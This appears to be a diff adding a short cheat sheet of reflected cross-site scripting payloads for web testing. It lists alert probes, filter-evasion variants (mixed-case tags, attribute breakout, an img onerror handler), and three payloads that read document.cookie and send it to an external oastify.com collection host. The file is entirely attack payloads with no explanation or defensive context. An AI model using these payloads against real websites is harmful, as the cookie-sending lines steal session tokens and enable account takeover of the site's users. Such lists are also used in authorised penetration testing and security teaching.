@@ -1,0 +1,22 @@
+XSS Reflected
+
+<script>alert(1)</script
+
+<ScRipt>alert(1)</ScRipt>
+
+"><script>alert(1)</script>
+
+<img src="x" onerror=alert(1)/>
+
+<script>alert(document.cookie)</script>
+
+<script>new 
+Image().src="http://4w1hvqo4ecp4608ast98ufd5kwqned22.oastify.com/?c="+document.cookie;</script>
+ 
+OR
+
+<img src="http://4w1hvqo4ecp4608ast98ufd5kwqned22.oastify.com/?c="+document.cookie>
+
+OR 
+
+<script>new Image().src="http://4w1hvqo4ecp4608ast98ufd5kwqned22.oastify.com/?c="+document.cookie;</script>
